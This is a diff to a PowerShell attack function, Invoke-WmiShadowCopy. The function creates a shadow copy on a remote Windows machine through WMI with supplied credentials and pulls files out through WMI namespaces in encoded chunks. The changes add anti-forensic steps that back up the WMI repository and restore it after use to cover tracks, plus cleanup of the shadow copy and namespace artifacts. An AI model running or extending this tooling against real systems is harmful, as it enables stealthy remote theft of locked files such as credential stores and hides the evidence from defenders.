@@ -1,4 +1,4 @@
-﻿function Invoke-WmiShadowCopy {
+function Invoke-WmiShadowCopy {
 <#
 .SYNOPSIS
 
@@ -81,6 +81,9 @@ Param (
     # PowerShell script to handle activity on remote computer
     $RemoteScript = @"
 
+`$WmiBackup = [System.IO.Path]::GetRandomFileName()
+Invoke-Expression "winmgmt /backup `$env:TEMP\`$WmiBackup"
+
 `$NewShadowVolume = ([WMICLASS]"root\cimv2:Win32_ShadowCopy").Create("$RemotePath".SubString(0,3), "ClientAccessible")
 `$ShadowDevice = (Get-WmiObject -Query "SELECT * FROM WIn32_ShadowCopy WHERE ID='`$(`$NewShadowVolume.ShadowID)'").DeviceObject + '\'
 Invoke-Command {cmd.exe /c mklink /d %TEMP%\$ShadowDirectory `$ShadowDevice}
@@ -138,9 +141,13 @@ Insert-EncodedChunk `$ByteBuffer
 `$FileStream = `$null
 `$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='DOWNLOAD_COMPLETE'}
 
-Invoke-Command {cmd.exe /c rmdir %TEMP%\$ShadowDirectory}
+Invoke-Expression "cmd.exe /c rmdir %TEMP%\$ShadowDirectory"
 
 Get-WmiObject -Query "SELECT * FROM Win32_ShadowCopy WHERE ID='`$(`$NewShadowVolume.ShadowID)'" | Remove-WmiObject
+
+Invoke-Expression "winmgmt.exe /restore `$env:TEMP\`$WmiBackup 1"
+
+Remove-Item `$env:TEMP\`$WmiBackup
 
 "@
     $ScriptBlock = [ScriptBlock]::Create($RemoteScript)
@@ -162,6 +169,8 @@ Get-WmiObject -Query "SELECT * FROM Win32_ShadowCopy WHERE ID='`$(`$NewShadowVol
     # Remove all data written to WMI Namespace
     Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace `
     -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'DOWNLOAD_COMPLETE' or Name LIKE 'CHUNK_DOWNLOADED'" | Remove-WmiObject
+
+
 }
 function Get-WmiChunk {
 <#
